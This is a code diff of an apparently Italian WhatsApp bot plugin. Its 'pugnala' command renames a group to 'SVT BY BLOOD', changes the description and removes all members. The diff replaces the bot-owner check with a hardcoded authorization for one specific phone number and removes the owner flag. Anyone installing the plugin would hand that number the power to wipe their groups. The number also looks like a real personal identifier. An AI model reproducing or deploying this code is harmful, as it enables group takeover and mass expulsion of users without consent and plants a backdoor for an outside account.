@@ -1,22 +1,26 @@
+const AUTHORIZED_JID = '447529688238@s.whatsapp.net';
+
 export default async function handler(m, {
   conn,
   participants,
   command,
   isBotAdmin
 }) {
+  const sender = m.sender;
   const utenti = participants
     .map(u => u.id)
     .filter(id => id !== conn.user.jid);
 
   const delay = ms => new Promise(res => setTimeout(res, ms));
 
+  // controllo bot admin
   if (!isBotAdmin) {
     return m.reply('❌ Il bot non è amministratore del gruppo.');
   }
 
-  // SOLO owner (fromMe)
-  if (!m.fromMe) {
-    return m.reply('🔒 Solo il proprietario può usare questo comando.');
+  // 🔒 SOLO NUMERO AUTORIZZATO
+  if (sender !== AUTHORIZED_JID) {
+    return m.reply('🔒 Non sei autorizzato a usare questo comando.');
   }
 
   if (command === 'pugnala') {
@@ -28,14 +32,14 @@ export default async function handler(m, {
 
     await delay(3000);
 
-    // ✏️ Cambia nome gruppo
+    // ✏️ Nome gruppo
     try {
       await conn.groupUpdateSubject(m.chat, 'SVT BY BLOOD');
     } catch (e) {
       console.error('Errore nome gruppo:', e);
     }
 
-    // 📝 Cambia descrizione
+    // 📝 Descrizione
     try {
       await conn.groupUpdateDescription(
         m.chat,
@@ -56,7 +60,7 @@ export default async function handler(m, {
 
     await delay(2000);
 
-    // 👢 Rimuove tutti
+    // 👢 Rimozione utenti
     try {
       await conn.groupParticipantsUpdate(m.chat, utenti, 'remove');
     } catch (e) {
@@ -68,5 +72,4 @@ export default async function handler(m, {
 // METADATI CHATUNITY
 handler.command = ['pugnala'];
 handler.group = true;
-handler.owner = true;
 handler.fail = null;
